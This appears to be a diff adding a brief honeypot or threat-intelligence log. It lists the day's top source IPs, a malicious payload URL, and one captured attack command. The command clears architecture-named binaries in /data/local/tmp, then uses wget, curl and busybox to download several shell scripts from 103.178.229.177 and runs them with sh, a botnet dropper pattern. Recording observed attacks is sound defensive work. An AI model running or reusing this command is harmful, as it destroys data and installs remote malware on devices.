@@ -1,0 +1,14 @@
+Top 5 IPs for todays date
+172.3.109.174
+190.224.75.160
+46.19.139.138
+101.42.25.236
+223.10.105.23
+
+#malcious payload observed:
+
+http://103.178.229.177/w.sh
+
+List of malcious commands : 
+cd /data/local/tmp/; rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*; rm -rf *arm7*; rm -rf *m68k*; rm -rf *mips*; rm -rf *mpsl*; rm -rf *ppc*; rm -rf *sh4*; rm -rf *spc*; rm -rf *x86*; rm -rf *x86_64*;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
+
